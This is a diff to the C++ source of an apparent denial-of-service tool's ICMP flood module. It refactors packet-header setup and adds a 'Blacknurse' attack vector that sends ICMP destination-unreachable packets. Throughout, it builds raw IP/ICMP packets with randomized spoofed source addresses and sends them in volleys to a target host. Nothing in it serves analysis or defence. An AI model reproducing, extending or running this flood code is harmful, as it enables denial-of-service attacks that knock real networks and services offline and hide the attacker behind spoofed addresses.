@@ -35,29 +35,18 @@ void ICMP_Flood::attack(const int *id) {
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP())) == -1){
+            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                 continue;
             }
 
-            // IP Struct
-            ip->version = 4;
-            ip->ihl = 5;
-            ip->tos = 0;
-            ip->tot_len = htons(sizeof(buf));
-            ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
-            ip->frag_off = htons(0x0);
-            ip->ttl = 255;
-            ip->protocol = IPPROTO_ICMP;
-            ip->check = 0;
+            init_headers(ip, icmp, buf);
+            override_options(icmp);
 
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
-            icmp->type = ICMP_ECHO;
-            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
-            icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
-            icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
+
             if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
@@ -71,10 +60,24 @@ void ICMP_Flood::attack(const int *id) {
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
-        usleep(static_cast<__useconds_t>(conf->delay));
+        pause();
     }
 }
 
 ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
 
+}
+
+void ICMP_Flood::override_options(icmphdr *icmp) {
+    switch (conf->vector){
+        case config::ICMPFlood:
+            icmp->type = ICMP_ECHO;
+            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
+            break;
+        case config::Blacknurse:
+            icmp->type = ICMP_DEST_UNREACH;
+            icmp->code = static_cast<u_int8_t>(3);
+            break;
+        default:break;
+    }
 }
